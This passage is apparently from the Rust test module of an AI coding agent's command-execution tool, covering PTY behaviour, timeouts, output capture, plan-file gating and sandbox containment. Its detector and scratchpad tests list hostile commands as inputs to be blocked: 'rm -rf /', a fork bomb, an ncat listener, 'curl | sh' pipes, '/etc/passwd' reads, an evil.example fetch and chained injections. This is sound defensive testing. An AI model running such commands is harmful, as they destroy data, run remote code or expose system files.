        // and only the cwd differs — the benign shape of the bug.
        std::fs::create_dir_all(project.join("sub")).unwrap();
        let plan_file = project.join(".mermaid/plans/x.md");

        let mk_ctx = || {
            let mut config = mermaid_domain::Config::default();
            config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
            config.safety.checkpoint_on_mutation = false;
            let (mut ctx, rx) = crate::providers::ctx::test_exec_context_with_config(
                TurnId(1),
                ToolCallId(1),
                project.clone(),
                config,
            );
            ctx.plan_file = Some(plan_file.clone());
            (ctx, rx)
        };

        // Baseline: the plan write from the project root is allowed and the
        // plan file really appears where the gate said it would.
        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "echo plan > .mermaid/plans/x.md"}),
                ctx,
            )
            .await;
        assert!(
            outcome.is_success(),
            "plan write must be allowed: {outcome:?}"
        );
        assert!(
            plan_file.exists(),
            "the plan file is the file that got written"
        );

        // The bug: same relative redirect, different cwd. The gate resolved
        // it against the project root and approved a write to
        // `<project>/sub/.mermaid/plans/x.md` — a file that is NOT the plan.
        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo elsewhere > .mermaid/plans/x.md",
                    "working_dir": project.join("sub").display().to_string(),
                }),
                ctx,
            )
            .await;
        assert_eq!(
            outcome.status,
            mermaid_domain::ToolStatus::Error,
            "a plan-relative write from another cwd is not a plan write: {outcome:?}",
        );
        assert!(
            !project.join("sub/.mermaid/plans/x.md").exists(),
            "nothing may be written outside the plan path",
        );

        let _ = std::fs::remove_dir_all(&project);
    }

    #[tokio::test]
    async fn safe_command_runs_and_captures_output() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        // Quoted so PowerShell's echo (Write-Output) prints one line, not one
        // line per bare argument.
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "echo 'hello world'"}), ctx)
            .await;
        assert!(outcome.is_success(), "expected success: {outcome:?}");
        assert!(outcome.output().contains("hello world"));
    }

    /// The foreground child must be a session leader (sid == its own pid).
    /// This is the non-vacuous half of the /dev/tty fix: a new session has no
    /// controlling terminal, so `sudo`-style prompts fail instead of writing
    /// over the TUI. Linux-only: probes /proc (field 6 of stat is the sid).
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn foreground_child_runs_in_new_session() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": r#"test "$(awk '{print $6}' /proc/$$/stat)" = "$$" && echo NEW_SESSION_OK || echo "NOT_A_SESSION_LEADER sid=$(awk '{print $6}' /proc/$$/stat) pid=$$""#,
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "expected success: {outcome:?}");
        assert!(
            outcome.output().contains("NEW_SESSION_OK"),
            "child shell is not a session leader: {}",
            outcome.output()
        );
    }

    /// The sudo-incident invariant, PTY era: `/dev/tty` must resolve to the
    /// CAPTURED pty, never the user's terminal — a prompt writes into the
    /// tool output instead of over the TUI. (The pipe path keeps the old
    /// stricter guarantee — see the pipes-mode test below.)
    #[cfg(unix)]
    #[tokio::test]
    async fn pty_child_dev_tty_is_the_captured_pty() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "if echo CAPTURED_BY_PTY > /dev/tty 2>/dev/null; then echo TTY_OPEN_OK; else echo TTY_OPEN_DENIED; fi",
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "expected success: {outcome:?}");
        assert!(
            outcome.output().contains("TTY_OPEN_OK"),
            "PTY child should see a controlling terminal: {}",
            outcome.output()
        );
        assert!(
            outcome.output().contains("CAPTURED_BY_PTY"),
            "/dev/tty writes must land in the CAPTURE, not the user's terminal: {}",
            outcome.output()
        );
    }

    /// Direct regression for the sudo incident on the PIPE path
    /// (`[exec] pty = false`): a child that opens `/dev/tty` must fail. Only
    /// meaningful where the test process itself has a controlling terminal —
    /// CI runners have none (the open fails for everyone there), so skip
    /// explicitly rather than pass vacuously.
    #[cfg(unix)]
    #[tokio::test]
    async fn foreground_child_cannot_open_dev_tty() {
        if std::fs::File::open("/dev/tty").is_err() {
            eprintln!("skipped: no controlling terminal in test environment");
            return;
        }
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "if echo x > /dev/tty 2>/dev/null; then echo TTY_OPEN_OK; else echo TTY_OPEN_DENIED; fi",
                }),
                ctx,
            )
            .await;
        assert!(
            outcome.output().contains("TTY_OPEN_DENIED"),
            "session-detached child could still open /dev/tty: {}",
            outcome.output()
        );
    }

    /// Pipe-mode context: `[exec] pty = false` pins the pipe spawn path.
    pub(crate) fn pipes_ctx() -> (
        crate::providers::ctx::ExecContext,
        tokio::sync::mpsc::Receiver<mermaid_domain::ProgressEvent>,
    ) {
        let mut config = mermaid_domain::Config::default();
        config.safety.mode = mermaid_runtime::SafetyMode::FullAccess;
        config.exec.pty = Some(false);
        crate::providers::ctx::test_exec_context_with_config(
            TurnId(1),
            ToolCallId(1),
            std::env::temp_dir(),
            config,
        )
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pty_child_sees_a_terminal_and_pipes_child_does_not() {
        // PTY (default): isatty(stdout) is true and `tty` names a pts.
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "if [ -t 1 ]; then echo IS_TTY; fi; tty"}),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(outcome.output().contains("IS_TTY"), "{}", outcome.output());
        assert!(
            outcome.output().contains("/dev/pts/") || outcome.output().contains("/dev/tty"),
            "tty should name the pts: {}",
            outcome.output()
        );
        // Pipes (`pty = false`): not a terminal.
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "if [ -t 1 ]; then echo IS_TTY; else echo NOT_TTY; fi"}),
                ctx,
            )
            .await;
        assert!(outcome.output().contains("NOT_TTY"), "{}", outcome.output());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pty_output_is_ansi_clean_and_crlf_normalized() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        // A color-emitting printf: the capture must carry the words, none of
        // the escape bytes, and PTY ONLCR \r\n must read back as plain \n.
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": r"printf '\033[31mRED\033[0m\nline2\n'",
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        let out = outcome.output();
        assert!(out.contains("RED\nline2"), "clean joined lines: {out:?}");
        assert!(!out.contains('\u{1b}'), "no escape bytes: {out:?}");
        assert!(!out.contains('\r'), "no carriage returns: {out:?}");
    }

    /// Windows twin of the unix isatty split: under ConPTY the child gets a
    /// real console (`IsOutputRedirected` is False); under `pty = false`
    /// pipes it sees redirected handles (True).
    #[cfg(windows)]
    #[tokio::test]
    async fn pty_child_sees_a_console_and_pipes_child_does_not() {
        let probe = "powershell -NoProfile -Command [Console]::IsOutputRedirected";
        // ConPTY (default): stdout is a console.
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": probe }), ctx)
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(
            outcome.output().contains("False"),
            "ConPTY child must see a console: {}",
            outcome.output()
        );
        // Pipes (`pty = false`): stdout is redirected.
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": probe }), ctx)
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(
            outcome.output().contains("True"),
            "pipe child must see redirected stdout: {}",
            outcome.output()
        );
    }

    /// Windows twin of the unix ANSI/CRLF test: ConPTY output reaches the
    /// model with escapes stripped and CRLF normalized. Line matching is
    /// whitespace-tolerant because ConPTY repaints pad lines to the
    /// pseudoconsole width.
    #[cfg(windows)]
    #[tokio::test]
    async fn pty_output_is_ansi_clean_and_crlf_normalized_windows() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({ "command": "echo RED; echo line2" }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        let out = outcome.output();
        assert!(!out.contains('\u{1b}'), "no escape bytes: {out:?}");
        assert!(!out.contains('\r'), "no carriage returns: {out:?}");
        let lines: Vec<&str> = out.lines().map(str::trim).collect();
        assert!(lines.contains(&"RED"), "RED line present: {out:?}");
        assert!(lines.contains(&"line2"), "line2 line present: {out:?}");
    }

    #[test]
    pub(crate) fn strip_ansi_drops_escapes_and_normalizes_line_endings() {
        // CSI color + cursor movement, OSC title (BEL and ST terminated),
        // two-byte ESC, CRLF and lone CR.
        assert_eq!(strip_ansi("\u{1b}[31mRED\u{1b}[0m"), "RED");
        assert_eq!(strip_ansi("\u{1b}[2K\u{1b}[1Gline"), "line");
        assert_eq!(strip_ansi("\u{1b}]0;title\u{7}body"), "body");
        assert_eq!(strip_ansi("\u{1b}]8;;url\u{1b}\\link"), "link");
        assert_eq!(strip_ansi("\u{1b}=keypad"), "keypad");
        assert_eq!(strip_ansi("a\r\nb"), "a\nb");
        assert_eq!(strip_ansi("50%\r100%\r\n"), "50%\n100%\n");
        // String sequences (DCS/SOS/PM/APC): the payload is consumed
        // through the ST terminator, not leaked into the text.
        assert_eq!(strip_ansi("\u{1b}P1$r0m\u{1b}\\text"), "text");
        assert_eq!(strip_ansi("\u{1b}_payload\u{1b}\\ok"), "ok");
        assert_eq!(strip_ansi("\u{1b}Xsos\u{1b}\\a\u{1b}^pm\u{1b}\\b"), "ab");
        // Backspace erases the previous character; bare BEL disappears.
        assert_eq!(strip_ansi("ab\u{8}c"), "ac");
        assert_eq!(strip_ansi("x\u{7}y"), "xy");
        // Backspace never eats a line break (or pops from empty output).
        assert_eq!(strip_ansi("a\n\u{8}b"), "a\nb");
        assert_eq!(strip_ansi("\u{8}b"), "b");
        // Plain text passes through untouched.
        assert_eq!(strip_ansi("plain text"), "plain text");
        // Truncated escape at end of input must not panic.
        assert_eq!(strip_ansi("x\u{1b}"), "x");
        assert_eq!(strip_ansi("x\u{1b}[31"), "x");
        // Truncated string sequence at end of input must not panic either.
        assert_eq!(strip_ansi("x\u{1b}Pdangling"), "x");
    }

    #[test]
    pub(crate) fn capped_capture_keeps_head_and_tail() {
        // Under the cap: byte-exact round trip.
        let mut c = CappedCapture::new(64);
        c.push(b"hello ");
        c.push(b"world");
        let (out, truncated) = c.finish();
        assert_eq!(out, "hello world");
        assert!(!truncated);
        // Over the cap: head survives, tail survives, middle elided.
        let mut c = CappedCapture::new(20);
        c.push(b"AAAAAAAAAA");
        c.push(&[b'x'; 100]);
        c.push(b"BBBBBBBBBB");
        let (out, truncated) = c.finish();
        assert!(truncated);
        assert!(out.starts_with("AAAAAAAAAA"), "head kept: {out:?}");
        assert!(out.ends_with("BBBBBBBBBB"), "tail kept: {out:?}");
        assert!(out.contains("truncated"), "marker present: {out:?}");
    }

    #[test]
    pub(crate) fn secret_env_names_reports_planted_secret() {
        // Uses the process env (read-only) — plant via temp_env.
        temp_env::with_var("MERMAID_TEST_PLANTED_API_KEY", Some("v"), || {
            let names = secret_env_names();
            assert!(
                names.iter().any(|n| n == "MERMAID_TEST_PLANTED_API_KEY"),
                "planted secret name must be scrubbed: {names:?}"
            );
            assert!(!names.iter().any(|n| n == "PATH"));
        });
    }

    #[test]
    pub(crate) fn harden_env_sets_git_terminal_prompt() {
        let mut cmd = Command::new("sh");
        harden_noninteractive_env(&mut cmd);
        let set = cmd
            .as_std()
            .get_envs()
            .any(|(k, v)| k == "GIT_TERMINAL_PROMPT" && v.is_some_and(|v| v == "0"));
        assert!(set, "GIT_TERMINAL_PROMPT=0 must be injected");
    }

    #[tokio::test]
    async fn dangerous_command_blocked() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "rm -rf /"}), ctx)
            .await;
        let error = outcome.error_message().expect("expected error");
        assert!(error.contains("Dangerous"));
    }

    #[tokio::test]
    async fn cancellation_aborts_long_running_command() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let token = ctx.token.clone();
        // `sleep` is a real long-runner on BOTH shells now (PowerShell aliases
        // it to Start-Sleep) — under cmd this errored instantly and the test
        // never actually killed a live child on Windows. 30s of sleep against
        // a 15s guard: a cancellation regression that waits the child out
        // blows the guard, while a slow-but-working cancel on a cold, loaded
        // CI runner (pwsh startup alone can take seconds there) still passes.
        let handle = tokio::spawn(async move {
            ExecuteCommandTool
                .execute(serde_json::json!({"command": "sleep 30"}), ctx)
                .await
        });
        // Give the child a beat to spawn, then cancel.
        tokio::time::sleep(Duration::from_millis(30)).await;
        token.cancel();
        let start = Instant::now();
        let outcome = tokio::time::timeout(Duration::from_secs(15), handle)
            .await
            .expect("didn't hang")
            .expect("join");
        let elapsed = start.elapsed();
        assert!(outcome.was_cancelled());
        // "Aborts promptly", with margin for process-teardown jitter and cold
        // shell startup on loaded runners — the hard hang case is the 15s
        // guard above.
        assert!(
            elapsed < Duration::from_secs(10),
            "cancellation took {elapsed:?} — far slower than expected (regression?)"
        );
    }

    #[tokio::test]
    async fn timeout_honored() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "sleep 5", "timeout": 1}), ctx)
            .await;
        assert_eq!(outcome.status, mermaid_domain::ToolStatus::Error);
        let output = outcome.as_tool_message_content();
        assert!(output.contains("timed out"));
        assert!(output.contains("was killed"));
        assert!(output.contains("mode=\"background\""));
    }

    /// RC-1 regression: a foreground command that forks a grandchild must have
    /// its WHOLE process group reaped on timeout, not just the shell. The old
    /// outer-`select!` form dropped the driver future on timeout, which only
    /// detached the task owning the `Child`, leaking the tree.
    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn timeout_kills_process_tree() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        // The grandchild records its own pid, then sleeps far past the timeout.
        let marker =
            std::env::temp_dir().join(format!("mermaid_timeout_pgid_{}.pid", std::process::id()));
        let _ = std::fs::remove_file(&marker);
        let command = format!(
            "sh -c 'echo $$ > {}; sleep 30' & sleep 30",
            marker.display()
        );
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": command, "timeout": 1 }), ctx)
            .await;
        assert_eq!(outcome.status, mermaid_domain::ToolStatus::Error);

        // Read the grandchild pid the command recorded (poll briefly in case the
        // write lands a touch after spawn).
        let mut pid = None;
        for _ in 0..30 {
            if let Ok(s) = std::fs::read_to_string(&marker)
                && let Ok(p) = s.trim().parse::<u32>()
            {
                pid = Some(p);
                break;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let pid = pid.expect("grandchild never recorded its pid");

        // It must be dead — poll to let SIGKILL + reparent/reap settle.
        let mut alive = true;
        for _ in 0..40 {
            if !process_running(pid).await {
                alive = false;
                break;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let _ = std::fs::remove_file(&marker);
        assert!(!alive, "grandchild pid {pid} leaked past the timeout");
    }

    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn background_mode_returns_pid_log_and_detected_url() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "printf 'ready http://127.0.0.1:54321\\n'; exec sleep 30",
                    "mode": "background",
                    "startup_timeout_secs": 2,
                    "ready_pattern": "ready"
                }),
                ctx,
            )
            .await;

        assert!(
            outcome.is_success(),
            "expected background success: {:?}",
            outcome
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Background command started"));
        assert!(output.contains("PID:"));
        assert!(output.contains("Log:"));
        assert!(output.contains("Ready: matched pattern"));
        assert!(output.contains("Detected URL: http://127.0.0.1:54321"));

        if let Some(pid) = parse_pid(&output) {
            let _ = Command::new("kill").arg(pid.to_string()).status().await;
        }
    }

    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn background_mode_returns_pid_and_log_on_windows() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                // The ready marker comes from cmd.exe (native, writes straight
                // to the inherited log handle) rather than a PowerShell cmdlet:
                // pwsh buffers cmdlet stdout when redirected to a file, so
                // `echo ready` can land seconds late — or after ping's own
                // native output — on a loaded runner. Real dev servers are
                // native writers too, so this matches what the ready-pattern
                // watch actually exists for. The wide startup window absorbs
                // cold pwsh starts on CI.
                serde_json::json!({
                    "command": "cmd /c echo ready; ping -n 60 127.0.0.1",
                    "mode": "background",
                    "startup_timeout_secs": 15,
                    "ready_pattern": "ready"
                }),
                ctx,
            )
            .await;

        assert!(
            outcome.is_success(),
            "expected background success on Windows: {outcome:?}"
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Background command started"));
        assert!(output.contains("PID:"));
        assert!(output.contains("Ready: matched pattern"));
        // The ManagedProcess must be attached so /processes lists it.
        assert!(
            outcome.metadata.process.is_some(),
            "background outcome must carry a ManagedProcess"
        );

        // Clean up the detached process (and its child ping) via the tree kill.
        if let Some(pid) = parse_pid(&output) {
            mermaid_model::utils::terminate_tree(pid, mermaid_model::utils::Grace::Graceful).await;
        }
    }

    #[tokio::test]
    async fn ctrl_b_backgrounds_a_running_foreground_command() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let background = ctx.background.clone();
        // A command that keeps running so it's still live when we background it.
        let command = if cfg!(target_os = "windows") {
            "ping -n 30 127.0.0.1"
        } else {
            "sleep 30"
        };

        // Press "Ctrl+B" shortly after the command starts.
        let canceller = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(300)).await;
            background.cancel();
        });
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({ "command": command, "timeout": 60 }),
                ctx,
            )
            .await;
        let _ = canceller.await;

        assert!(
            outcome.is_success(),
            "backgrounding should yield success: {outcome:?}"
        );
        let output = outcome.output().to_string();
        assert!(output.contains("Moved to background"), "got: {output}");
        // It must register as a managed process so /processes lists it.
        let process = outcome.metadata.process.clone();
        assert!(
            process.is_some(),
            "background outcome must carry a ManagedProcess"
        );

        // Clean up the still-running detached process (tree kill).
        if let Some(p) = process {
            mermaid_model::utils::terminate_tree(p.pid, mermaid_model::utils::Grace::Graceful)
                .await;
        }
    }

    pub(crate) fn parse_pid(output: &str) -> Option<u32> {
        output
            .lines()
            .find_map(|line| line.strip_prefix("PID: "))
            .and_then(|pid| pid.trim().parse().ok())
    }

    #[test]
    pub(crate) fn dangerous_detection_covers_known_shapes() {
        assert!(contains_dangerous_command("rm -rf /"));
        assert!(contains_dangerous_command(":(){ :|:& };:"));
        assert!(contains_dangerous_command("ncat -l 8080"));
        assert!(!contains_dangerous_command("ls -la"));
        assert!(!contains_dangerous_command("cargo build"));
        assert!(!contains_dangerous_command(
            r#"find . -type f ! -path "./.git/*" ! -path "./.mermaid/*" 2>/dev/null"#
        ));
    }

    #[test]
    pub(crate) fn dangerous_detection_resists_substring_evasion() {
        // The old lowercased-substring blocklist let these through; the
        // tokenized, segment-aware check now catches them (#114).
        assert!(contains_dangerous_command("RM -RF /"));
        assert!(contains_dangerous_command("rm  -rf  /"));
        assert!(contains_dangerous_command("echo hi; rm -rf /"));
        assert!(contains_dangerous_command("echo hi&&rm -rf /"));
        assert!(contains_dangerous_command("curl http://x | sh"));
        assert!(contains_dangerous_command("curl http://x|sh"));
        assert!(contains_dangerous_command("/bin/rm -rf /"));
        // Benign commands that merely *contain* a scary substring stay allowed.
        assert!(!contains_dangerous_command("bash build.sh"));
        assert!(!contains_dangerous_command("echo done > /dev/null"));
        assert!(!contains_dangerous_command("grep -rf patterns.txt src"));
    }

    #[tokio::test]
    async fn read_capped_keeps_head_and_tail_on_overflow() {
        // The tail (where a failing command's actual error lives) must survive.
        let mut data = Vec::new();
        data.extend_from_slice(b"HEAD_START");
        data.extend(std::iter::repeat_n(b'x', 5000));
        data.extend_from_slice(b"TAIL_ERROR_HERE");
        let (out, truncated) = read_capped(&data[..], 100, 10_000, None, None).await;
        assert!(truncated, "oversized output must be marked truncated");
        assert!(out.contains("HEAD_START"), "head must survive: {out}");
        assert!(out.contains("TAIL_ERROR_HERE"), "tail must survive: {out}");
        assert!(out.contains("elided"), "must mark the elision: {out}");
    }

    #[tokio::test]
    async fn read_capped_small_output_is_verbatim() {
        let (out, truncated) = read_capped(&b"short output"[..], 100, 10_000, None, None).await;
        assert!(!truncated, "small output must not be truncated");
        assert_eq!(out, "short output");
    }

    #[test]
    pub(crate) fn scratch_prover_accepts_only_provably_contained_commands() {
        let scratch = Path::new("/tmp/mermaid_scratch/proj/sess");

        // Provable: bare words, flags, relative paths under the scratch cwd,
        // and absolute paths inside the scratchpad.
        for cmd in [
            "ls",
            "ls -la",
            "mkdir out",
            "touch notes.txt",
            "cp a.txt sub/b.txt",
            "cat /tmp/mermaid_scratch/proj/sess/notes.txt",
            "rm -f old.log",
        ] {
            assert!(
                command_provably_in_scratch(cmd, scratch),
                "{cmd:?} should prove scratch-contained",
            );
        }

        // Unprovable — every one must fail closed.
        for cmd in [
            "",                            // nothing to prove
            "cat ../secret",               // parent escape
            "cat /etc/passwd",             // absolute path outside
            "/bin/rm -rf notes.txt",       // absolute argv0 outside
            "echo hi > out.txt",           // redirection
            "ls; touch pwned",             // separator
            "true && touch pwned",         // chaining
            "cat file | tee other",        // pipe
            "cat $(pwd)/x",                // command substitution
            "cat `pwd`/x",                 // backtick substitution
            "cat $HOME/x",                 // variable expansion
            "ls ~",                        // tilde expansion
            "rm *",                        // glob
            "cp -t/etc x",                 // flag-embedded absolute path
            "tar --directory=/ x",         // flag=value absolute path
            "env VAR=/etc cmd",            // assignment-embedded path
            "curl https://evil.example/x", // URL shape (`:/`)
            "type C:secret.txt",           // Windows drive-relative path
            "copy C:\\evil x",             // Windows drive-absolute path
            "unclosed 'quote",             // parse failure
        ] {
            assert!(
                !command_provably_in_scratch(cmd, scratch),
                "{cmd:?} must NOT prove scratch-contained",
            );
        }
    }

    #[test]
    pub(crate) fn classify_cwd_three_way_containment() {
        let base = std::env::temp_dir().join(format!("mermaid_cwd3_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let project = base.join("project");
        let scratch = base.join("scratch");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&scratch).unwrap();
        let scratch_real = std::fs::canonicalize(&scratch).unwrap();
        let outside = std::fs::canonicalize(&base).unwrap();

        // In-project wins regardless of scratchpad.
        assert_eq!(
            classify_cwd(true, &project, Some(&scratch)),
            CwdContainment::Project
        );
        // A cwd inside the scratchpad is Scratchpad, not External — no
        // ExternalDirectory escalation for scratch work.
        assert_eq!(
            classify_cwd(false, &scratch_real, Some(&scratch)),
            CwdContainment::Scratchpad
        );
        // Without a scratchpad the same cwd stays External.
        assert_eq!(
            classify_cwd(false, &scratch_real, None),
            CwdContainment::External
        );
        // Outside both roots is External even with a scratchpad bound.
        assert_eq!(
            classify_cwd(false, &outside, Some(&scratch)),
            CwdContainment::External
        );
        // A missing scratch dir can't match — fails closed to External.
        assert_eq!(
            classify_cwd(false, &scratch_real, Some(&base.join("missing"))),
            CwdContainment::External
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn scratch_cwd_is_not_escalated_to_external_directory() {
        // Mirror of `out_of_project_working_dir_is_escalated_and_blocked`: the
        // same read-only command that is BLOCKED in a random outside dir must
        // RUN when the outside dir is the session scratchpad — proving the
        // scratch cwd keeps the plain Shell category.
        let base = std::env::temp_dir().join(format!("mermaid_scwd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let project = base.join("project");
        let scratch = base.join("scratch");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&scratch).unwrap();

        // ReadOnly gate: an ExternalDirectory escalation would classify as
        // ExternalAccess and be denied; a Shell read-only command is allowed.
        let mut config = mermaid_domain::Config::default();
        config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
        let (mut ctx, _rx) = crate::providers::ctx::test_exec_context_with_config(
            TurnId(1),
            ToolCallId(1),
            project.clone(),
            config,
        );
        ctx.scratchpad = Some(scratch.clone());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo hi",
                    "working_dir": scratch.display().to_string(),
                }),
                ctx,
            )
            .await;
        assert!(
            outcome.is_success(),
            "scratch cwd must not be escalated to ExternalDirectory: {outcome:?}",
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn child_env_carries_scratchpad_export() {
        // cfg-gated sh/cmd probe: the exported MERMAID_SCRATCHPAD must reach
        // the child, and must be absent when the session has no scratchpad.
        let dir = std::env::temp_dir().join(format!("mermaid_env_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        #[cfg(unix)]
        let probe = r#"printf %s "${MERMAID_SCRATCHPAD:-UNSET}""#;
        #[cfg(windows)]
        let probe = "if ($env:MERMAID_SCRATCHPAD) { Write-Output $env:MERMAID_SCRATCHPAD } else { Write-Output UNSET }";

        let run = |scratchpad: Option<PathBuf>| {
            let dir = dir.clone();
            async move {
                let mut cmd = build_sandboxed_shell(probe, false, None);
                cmd.current_dir(&dir)
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::null())
                    // The parent test process must not leak a value into the
                    // negative case.
                    .env_remove(SCRATCHPAD_ENV_VAR);
                export_scratchpad_env(&mut cmd, scratchpad.as_deref());
                let out = cmd.output().await.expect("probe spawns");
                String::from_utf8_lossy(&out.stdout).trim().to_string()
            }
        };

        let exported = run(Some(dir.clone())).await;
        assert_eq!(
            exported,
            dir.display().to_string(),
            "child must see the scratchpad path",
        );
        let absent = run(None).await;
        assert_eq!(absent, "UNSET", "no scratchpad -> no exported variable");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
